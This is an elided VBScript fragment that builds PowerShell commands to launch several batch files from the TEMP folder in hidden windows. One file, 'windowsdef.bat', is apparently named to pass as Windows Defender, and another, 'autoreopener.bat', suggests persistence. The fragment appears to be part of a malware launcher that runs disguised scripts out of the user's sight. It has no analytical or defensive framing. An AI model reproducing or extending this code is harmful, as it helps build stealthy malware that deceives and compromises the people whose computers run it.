...
pscom = _
    ...
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' ""$env:TEMP\windowsdef.bat"";"
...
psCommand = _
    ...
    "Set-Location '" & downloads & "'; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' ""$env:TEMP\inh.bat""; " & _
    "Start-Process -WindowStyle Hidden -WorkingDirectory '" & downloads & "' ""$env:TEMP\autoreopener.bat"";"
